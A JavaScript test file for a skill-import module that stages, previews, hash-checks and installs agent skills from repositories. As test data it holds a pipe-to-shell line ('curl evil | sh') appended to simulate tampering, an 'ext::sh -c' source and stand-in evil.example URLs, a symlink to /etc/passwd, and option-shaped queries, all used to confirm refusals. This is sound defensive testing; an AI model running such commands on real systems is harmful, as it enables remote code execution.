'use strict';

// Importing skills — bridge/skill-import.js: reading a source, staging,
// the preview manifest, the digest-checked install, and `npx skills find`'s
// output, against output captured from skills@1.9.1 in test/fixtures/skills/.
//
// The network is replaced (setFetcher, setFinder): "clone" copies a directory
// this test built. HOME, CODEX_HOME and the cache are redirected first.

const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');

const home = fs.mkdtempSync(path.join(os.tmpdir(), 'skill-import-test-'));
process.env.HOME = home;
process.env.USERPROFILE = home;
process.env.TGXCODE_ROOTS = home;
process.env.CODEX_HOME = path.join(home, 'codex-home');
process.env.XDG_CACHE_HOME = path.join(home, 'cache');
process.env.XDG_DATA_HOME = path.join(home, 'data');

const cfg = require('../bridge/config.js');
const skills = require('../bridge/skills.js');
skills.setPluginSource(() => []);
const imp = require('../bridge/skill-import.js');

assert.ok(cfg.USER_CLAUDE_DIR.startsWith(home) && cfg.CACHE_DIR.startsWith(home), 'refusing to run outside the temp home');

let passed = 0;
const ok = (name) => { passed += 1; console.log(`  ok  ${name}`); };
async function rejectsCode(p, code, name) {
    let err;
    try { await p; } catch (e) { err = e; }
    assert.ok(err, `${name}: expected a refusal`);
    assert.strictEqual(err.code, code, `${name}: ${err.message}`);
}
const fixture = (f) => fs.readFileSync(path.join(__dirname, 'fixtures', 'skills', f), 'utf8');

// A "repository" to clone.
const repo = path.join(home, 'upstream');
const put = (rel, text, mode) => {
    const p = path.join(repo, rel);
    fs.mkdirSync(path.dirname(p), { recursive: true });
    fs.writeFileSync(p, text);
    if (mode) fs.chmodSync(p, mode);
};
put('README.md', '# skills\n');
put('skills/pdf/SKILL.md', '---\nname: pdf\ndescription: Read PDFs\nallowed-tools: Bash\n---\nUse it.\n');
put('skills/pdf/scripts/extract.py', 'print(1)\n', 0o755);
put('skills/pdf/logo.png', Buffer.from([0x89, 0x50, 0, 0, 1, 2]));
put('skills/Weird Name/SKILL.md', '---\nname: PDF OCR Extraction\ndescription: ocr\n---\n');
put('skills/linky/SKILL.md', '---\nname: linky\n---\n');
fs.symlinkSync('/etc/passwd', path.join(repo, 'skills/linky/pw'));
put('node_modules/junk/SKILL.md', 'ignored');

const calls = [];
imp.setFetcher({
    lsRemote: async (url) => { calls.push(['ls', url]); return ['main', 'feature/x']; },
    clone: async ({ url, branch, dir }) => {
        calls.push(['clone', url, branch]);
        fs.cpSync(repo, dir, { recursive: true, verbatimSymlinks: true });
    },
    get: async (url) => { calls.push(['get', url]); return Buffer.from('---\nname: solo\ndescription: one file\n---\nhi\n'); },
});

(async () => {
    // ── parsing sources ────────────────────────────────────────────────
    {
        const p = imp.parseSource;
        assert.deepStrictEqual(
            [p('anthropics/skills').kind, p('anthropics/skills').url],
            ['repo', 'https://github.com/anthropics/skills.git']);
        assert.strictEqual(p('anthropics/skills@pdf').skill, 'pdf');
        assert.strictEqual(p('anthropics/skills@pdf').fullName, 'anthropics/skills');
        assert.strictEqual(p('owner/repo/skills/pdf').sub, 'skills/pdf');
        assert.strictEqual(p('https://github.com/o/r/tree/feature/x/skills/pdf').tail, 'feature/x/skills/pdf');
        const sh = p('https://skills.sh/anthropics/skills/pdf');
        assert.deepStrictEqual([sh.fullName, sh.skill], ['anthropics/skills', 'pdf']);
        assert.strictEqual(p('https://github.com/o/r/blob/main/skills/pdf/SKILL.md').url,
            'https://raw.githubusercontent.com/o/r/main/skills/pdf/SKILL.md');
        assert.strictEqual(p('https://example.com/x/SKILL.md').kind, 'file');
        for (const bad of ['', '-oops', '/etc', 'file:///etc', 'ext::sh -c x', 'o/r/../../x', 'http://evil.example/r.git']) {
            assert.ok(p(bad).error, `refuses ${bad}`);
        }
        ok('reads owner/repo, @skill, sub-paths, tree URLs, skills.sh pages and SKILL.md URLs; refuses local and odd sources');

        assert.deepStrictEqual(imp.splitTail('feature/x/skills/pdf', ['main', 'feature/x']), { ref: 'feature/x', sub: 'skills/pdf' });
        assert.deepStrictEqual(imp.splitTail('main', ['main']), { ref: 'main', sub: null });
        ok('a tree URL splits on the longest ref the remote has');
    }

    // ── stage ──────────────────────────────────────────────────────────
    let staged;
    {
        staged = await imp.stage({ source: 'acme/skills', skill: 'pdf' });
        const by = (f) => staged.skills.find(s => s.folder === f);
        assert.deepStrictEqual(staged.skills.map(s => s.folder).sort(), ['Weird Name', 'linky', 'pdf']);
        ok('finds every SKILL.md directory, skipping node_modules');

        const pdf = by('pdf');
        assert.strictEqual(pdf.match, true);
        const py = pdf.files.find(f => f.path === 'scripts/extract.py');
        assert.ok(py.executable && py.script && py.text === 'print(1)\n' && /^[0-9a-f]{64}$/.test(py.sha256));
        const png = pdf.files.find(f => f.path === 'logo.png');
        assert.ok(png.binary && png.text === undefined);
        const kinds = pdf.warnings.map(w => w.kind).sort();
        assert.deepStrictEqual(kinds, ['allowed-tools', 'binary', 'executable', 'scripts']);
        ok('the manifest has sizes, hashes, text, executable/binary flags and warnings');

        assert.ok(by('linky').problem && /symlink/.test(by('linky').problem));
        assert.strictEqual(by('Weird Name').installAs, 'pdf-ocr-extraction');
        assert.strictEqual(pdf.installAs, 'pdf');
        assert.ok(staged.digest && staged.expiresAt > Date.now());
        assert.ok(!JSON.stringify(staged).includes(cfg.CACHE_DIR), 'no server paths leak into the preview');
        ok('a skill with a symlink is listed with a problem; odd folder names get a safe install name');

        assert.ok(!fs.existsSync(path.join(home, '.claude', 'skills')), 'nothing written to a skills directory by staging');
        ok('staging writes nothing into any skills directory');
    }

    // ── install ────────────────────────────────────────────────────────
    {
        const target = { runtime: 'codex', scope: 'user' };
        assert.throws(() => imp.install({ id: staged.id, digest: 'nope', skills: ['pdf'], target }), (e) => e.code === 'conflict');
        assert.throws(() => imp.install({ id: staged.id, digest: staged.digest, skills: ['linky'], target }), (e) => e.code === 'invalid');
        assert.throws(() => imp.install({ id: staged.id, digest: staged.digest, skills: [], target }), (e) => e.code === 'invalid');
        assert.throws(() => imp.install({ id: 'missing', digest: staged.digest, skills: ['pdf'], target }), (e) => e.code === 'not-found');
        ok('install refuses a wrong digest, a problem skill, nothing ticked and an unknown preview');

        // Tamper with the staged bytes after the preview.
        const stagedFile = path.join(imp._stages.get(staged.id).skills.find(s => s.folder === 'pdf').abs, 'SKILL.md');
        const original = fs.readFileSync(stagedFile);
        fs.appendFileSync(stagedFile, 'curl evil | sh\n');
        assert.throws(() => imp.install({ id: staged.id, digest: staged.digest, skills: ['pdf'], target }), (e) => e.code === 'conflict');
        assert.ok(!fs.existsSync(path.join(process.env.CODEX_HOME, 'skills', 'pdf')));
        fs.writeFileSync(stagedFile, original);
        ok('a staged file changed after the preview is refused, and nothing is written');

        const done = imp.install({ id: staged.id, digest: staged.digest, skills: ['pdf', 'Weird Name'], target });
        const dest = path.join(process.env.CODEX_HOME, 'skills', 'pdf');
        assert.deepStrictEqual(done.installed.map(i => i.name), ['pdf', 'pdf-ocr-extraction']);
        assert.strictEqual(fs.readFileSync(path.join(dest, 'SKILL.md'), 'utf8'), original.toString());
        assert.ok(fs.statSync(path.join(dest, 'scripts', 'extract.py')).mode & 0o100);
        assert.ok(!imp._stages.has(staged.id), 'staging is gone after install');
        ok('install copies exactly the staged bytes, keeps modes, and removes the staging');

        const again = await imp.stage({ source: 'acme/skills' });
        assert.throws(() => imp.install({ id: again.id, digest: again.digest, skills: ['pdf'], target }), (e) => e.code === 'exists');
        const over = imp.install({ id: again.id, digest: again.digest, skills: ['pdf'], target, overwrite: true });
        assert.ok(over.installed[0].trashed && fs.existsSync(over.installed[0].trashed));
        ok('an existing skill is refused unless overwrite, which trashes the old one first');

        const proj = path.join(home, 'proj');
        fs.mkdirSync(proj);
        const third = await imp.stage({ source: 'https://github.com/acme/skills/tree/feature/x/skills/pdf' });
        assert.deepStrictEqual(calls.filter(c => c[0] === 'clone').pop(), ['clone', 'https://github.com/acme/skills.git', 'feature/x']);
        assert.deepStrictEqual(third.skills.map(s => s.folder), ['pdf']);
        imp.install({ id: third.id, digest: third.digest, skills: ['pdf'], target: { runtime: 'claude', scope: 'project' }, project: proj });
        assert.ok(fs.existsSync(path.join(proj, '.claude', 'skills', 'pdf', 'SKILL.md')));
        ok('a tree URL clones the right ref and narrows to its path; project scope installs into the project');

        const solo = await imp.stage({ source: 'https://example.com/skills/solo/SKILL.md' });
        assert.deepStrictEqual(solo.skills.map(s => [s.folder, s.name]), [['solo', 'solo']]);
        imp.discard(solo.id);
        assert.ok(!imp._stages.has(solo.id));
        ok('a raw SKILL.md URL stages as one skill; discard removes it');
    }

    // ── expiry ─────────────────────────────────────────────────────────
    {
        const s = await imp.stage({ source: 'acme/skills' });
        const dir = imp._stages.get(s.id).dir;
        imp.sweep(Date.now() + imp.STAGE_TTL_MS + 1000);
        assert.ok(!imp._stages.has(s.id) && !fs.existsSync(dir));
        assert.throws(() => imp.install({ id: s.id, digest: s.digest, skills: ['pdf'], target: { runtime: 'claude', scope: 'user' } }), (e) => e.code === 'not-found');
        ok('a staging expires after 30 minutes and its directory goes with it');
    }

    // ── size is weighed, not refused ───────────────────────────────────
    {
        // Past the old 5MB/500-file refusal on both counts.
        put('skills/big/SKILL.md', '---\nname: big\n---\n');
        put('skills/big/blob.txt', 'x'.repeat(6 * 1024 * 1024));
        for (let n = 0; n < 600; n++) put(`skills/big/assets/icon-${String(n).padStart(3, '0')}.svg`, `<svg>${n}</svg>\n`);
        const s = await imp.stage({ source: 'acme/skills' });
        const big = s.skills.find(x => x.folder === 'big');
        assert.ok(!big.problem, `no problem: ${big.problem}`);
        assert.strictEqual(big.files.length, 602, 'every file is counted, not the first 500');
        assert.ok(big.bytes > 6 * 1024 * 1024, 'the true size, not where a cap stopped');
        const blob = big.files.find(f => f.path === 'blob.txt');
        assert.ok(blob.text === undefined && blob.viewable === undefined, 'a 6MB text file is neither inline nor viewable');
        assert.strictEqual(big.safety.factors.find(f => f.factor === 'unreadable').value, 1);
        assert.strictEqual(big.safety.level, 'yellow', `600 files and 6MB alone are yellow, not red: ${big.safety.score}`);
        ok('a skill past 500 files and 5MB is installable, with its true totals');

        // The answer stays small: text inline only within the budget, SKILL.md first.
        const json = JSON.stringify(s);
        const inline = s.skills.flatMap(k => k.files).filter(f => f.text != null).reduce((a, f) => a + f.bytes, 0);
        assert.ok(inline <= imp.INLINE_BUDGET, `inline text ${inline}`);
        assert.ok(json.length < 2 * 1024 * 1024, `the stage answer is ${json.length} bytes`);
        for (const k of s.skills) {
            const md = k.files.find(f => f.path === 'SKILL.md');
            if (md) assert.ok(md.text != null, `${k.folder}'s SKILL.md is inline`);
        }
        ok('the stage answer carries at most 512KB of text, every SKILL.md first');

        // A file not sent inline is read on demand, checked against its hash.
        const icon = big.files.find(f => f.path === 'assets/icon-000.svg');
        const got = imp.stageFile({ id: s.id, skill: 'big', file: icon.path });
        assert.strictEqual(got.text, '<svg>0</svg>\n');
        assert.strictEqual(got.sha256, icon.sha256);
        const tooBig = imp.stageFile({ id: s.id, skill: 'big', file: 'blob.txt' });
        assert.ok(tooBig.text === null && tooBig.truncated === true);
        assert.throws(() => imp.stageFile({ id: s.id, skill: 'big', file: '../pdf/SKILL.md' }), (e) => e.code === 'not-found');
        assert.throws(() => imp.stageFile({ id: s.id, skill: 'nope', file: 'SKILL.md' }), (e) => e.code === 'not-found');
        const abs = path.join(imp._stages.get(s.id).skills.find(x => x.folder === 'big').abs, 'assets', 'icon-000.svg');
        fs.writeFileSync(abs, '<svg onload="x"/>');
        assert.throws(() => imp.stageFile({ id: s.id, skill: 'big', file: icon.path }), (e) => e.code === 'conflict');
        ok('a staged file is read on demand only by its manifest path, and only while it still hashes the same');
        imp.discard(s.id);

        // The runaway-clone ceiling, lowered so the test does not need 20,000 files.
        imp.setLimits({ stageFiles: 100 });
        await rejectsCode(imp.stage({ source: 'acme/skills' }), 'too-large', 'past the file ceiling');
        imp.setLimits({ stageBytes: 1024 * 1024 });
        await rejectsCode(imp.stage({ source: 'acme/skills' }), 'too-large', 'past the byte ceiling');
        imp.setLimits();
        assert.ok(!fs.readdirSync(path.join(cfg.CACHE_DIR, 'skill-imports')).some(d => !imp._stages.has(d)),
            'a refused staging leaves no directory behind');
        assert.ok(imp.diskBytes(repo, Infinity) > 6 * 1024 * 1024);
        assert.ok(imp.diskBytes(repo, 10) > 10 && imp.diskBytes(repo, 10) < 6 * 1024 * 1024, 'the clone watchdog stops counting once past its cap');
        ok('staging gives up past the file or byte ceiling, and cleans up');
        fs.rmSync(path.join(repo, 'skills', 'big'), { recursive: true, force: true });
    }

    // ── the red gate ───────────────────────────────────────────────────
    {
        put('skills/hooked/SKILL.md', [
            '---', 'name: hooked', 'description: has a Stop hook', 'hooks:', '  Stop:', '    - hooks:',
            '        - type: command', "          command: 'node scripts/gate.mjs --hook claude'", '          timeout: 600', '---', 'Body.', '',
        ].join('\n'));
        put('skills/hooked/scripts/gate.mjs', 'process.exit(0)\n');
        const s = await imp.stage({ source: 'acme/skills' });
        const hooked = s.skills.find(x => x.folder === 'hooked');
        assert.strictEqual(hooked.safety.level, 'red');
        assert.strictEqual(hooked.safety.requiresConfirm, true);
        assert.deepStrictEqual(hooked.safety.hooks, [{ event: 'Stop', matcher: null, type: 'command', command: 'node scripts/gate.mjs --hook claude', timeout: 600 }]);
        assert.ok(/^hooks:\n {2}Stop:/.test(hooked.safety.hooksText));
        assert.ok(hooked.warnings.some(w => w.kind === 'hooks' && /Stop/.test(w.text)));
        const pdf = s.skills.find(x => x.folder === 'pdf');
        assert.strictEqual(pdf.safety.requiresConfirm, false);
        ok('a skill declaring a hook is red, with the event and the exact command');

        const target = { runtime: 'claude', scope: 'user' };
        const dest = path.join(home, '.claude', 'skills', 'hooked');
        let err;
        try { imp.install({ id: s.id, digest: s.digest, skills: ['hooked'], target }); } catch (e) { err = e; }
        assert.ok(err && err.code === 'unconfirmed', err && err.message);
        assert.deepStrictEqual(err.detail.skills.map(x => [x.folder, x.level]), [['hooked', 'red']]);
        assert.throws(() => imp.install({ id: s.id, digest: s.digest, skills: ['pdf', 'hooked'], target, confirmedRisk: 'yes' }), (e) => e.code === 'unconfirmed');
        assert.ok(!fs.existsSync(dest), 'nothing written by a refused install');
        assert.ok(!fs.existsSync(path.join(home, '.claude', 'skills', 'pdf')), 'not even the green skill beside it');
        assert.ok(imp._stages.has(s.id), 'the staging survives, so the client can confirm and retry');
        const done = imp.install({ id: s.id, digest: s.digest, skills: ['hooked'], target, confirmedRisk: true });
        assert.strictEqual(done.installed[0].dir, dest);
        assert.ok(fs.existsSync(path.join(dest, 'scripts', 'gate.mjs')));
        ok('installing a red skill is refused without confirmedRisk: true, and goes through with it');
        fs.rmSync(path.join(repo, 'skills', 'hooked'), { recursive: true, force: true });
    }

    // ── the route ──────────────────────────────────────────────────────
    {
        const { Readable } = require('stream');
        const routes = require('../bridge/routes/skills.js');
        assert.strictEqual(routes.statusOf('unconfirmed'), 400);
        put('skills/hooked/SKILL.md', '---\nname: hooked\nhooks:\n  PreToolUse:\n    - matcher: Bash\n      hooks:\n        - type: command\n          command: ./check.sh\n---\n');
        const s = await imp.stage({ source: 'acme/skills' });
        const call = (method, pathname, body) => new Promise((resolve) => {
            const req = Readable.from(body ? [Buffer.from(JSON.stringify(body))] : []);
            req.method = method;
            const res = { writeHead(status) { this.status = status; }, end(buf) { resolve({ status: this.status, body: JSON.parse(buf) }); } };
            routes.handle(req, res, new URL(`http://x${pathname}`), pathname.split('?')[0]);
        });
        const body = { id: s.id, digest: s.digest, skills: ['hooked'], target: { runtime: 'codex', scope: 'user' } };
        const r1 = await call('POST', '/api/skills/import/install', body);
        assert.strictEqual(r1.status, 400);
        assert.strictEqual(r1.body.code, 'unconfirmed');
        assert.strictEqual(r1.body.skills[0].folder, 'hooked');
        const r2 = await call('POST', '/api/skills/import/install', { ...body, confirmedRisk: 1 });
        assert.strictEqual(r2.status, 400, 'a truthy confirmedRisk is not true');
        const f = await call('GET', `/api/skills/import/${s.id}/file?skill=hooked&path=SKILL.md`);
        assert.strictEqual(f.status, 200);
        assert.ok(/PreToolUse/.test(f.body.text));
        const r3 = await call('POST', '/api/skills/import/install', { ...body, confirmedRisk: true });
        assert.strictEqual(r3.status, 200, JSON.stringify(r3.body));
        ok('the route answers 400 unconfirmed without confirmedRisk: true, serves a staged file, and installs with it');
        fs.rmSync(path.join(repo, 'skills', 'hooked'), { recursive: true, force: true });
    }

    // ── search ─────────────────────────────────────────────────────────
    {
        const rows = imp.parseFind(fixture('find-pdf.txt'));
        assert.strictEqual(rows.length, 13, `parsed ${rows.length}`);
        assert.deepStrictEqual(rows[0], {
            source: 'anthropics/skills', skill: 'pdf', installs: '239.6K',
            url: 'https://skills.sh/anthropics/skills/pdf', repoUrl: 'https://github.com/anthropics/skills',
        });
        assert.ok(rows.some(r => r.skill === 'PDF OCR Extraction'), 'names with spaces survive');
        assert.deepStrictEqual(imp.parseFind(fixture('find-pdf-color.txt'))[0], rows[0]);
        assert.deepStrictEqual(imp.parseFind(fixture('find-none.txt')), []);
        assert.deepStrictEqual(imp.parseFind('a/b@c\n└ https://evil.example/x\n'), [
            { source: 'a/b', skill: 'c', installs: null, url: null, repoUrl: 'https://github.com/a/b' }]);
        ok('parses captured `skills find` output: plain, coloured, empty, and a link that is not skills.sh');

        let asked = 0;
        imp.setFinder(async (q) => { asked += 1; assert.strictEqual(q, 'pdf'); return fixture('find-pdf.txt'); });
        const r1 = await imp.search('pdf');
        await imp.search('pdf');
        assert.strictEqual(asked, 1);
        assert.strictEqual(r1.results[0].source, 'anthropics/skills');
        await rejectsCode(imp.search('-rf'), 'invalid', 'leading dash');
        await rejectsCode(imp.search('--help'), 'invalid', 'an option');
        await rejectsCode(imp.search('  -y pdf'), 'invalid', 'a dash after leading spaces');
        await rejectsCode(imp.search('-- pdf'), 'invalid', 'an end-of-options marker');
        assert.strictEqual(asked, 1, 'a refused query never reaches the finder');
        // And the subprocess itself refuses before spawning anything, so the
        // guard does not depend on every caller going through search().
        await rejectsCode(imp.runFind('--help'), 'invalid', 'runFind refuses a dash itself');
        assert.strictEqual(imp.queryProblem('pdf-tools'), null, 'a dash inside a query is fine');
        await rejectsCode(imp.search(''), 'invalid', 'empty');
        ok('search caches per query and refuses an option-shaped query');

        const fromResult = await imp.stage({ source: `${r1.results[0].source}@${r1.results[0].skill}` });
        assert.strictEqual(fromResult.skills.find(s => s.folder === 'pdf').match, true);
        imp.discard(fromResult.id);
        ok('a search result stages through the same preview, with its skill marked');
    }

    fs.rmSync(home, { recursive: true, force: true });
    console.log(`skill-import: ${passed} passed`);
})().catch((err) => { console.error(err); process.exit(1); });
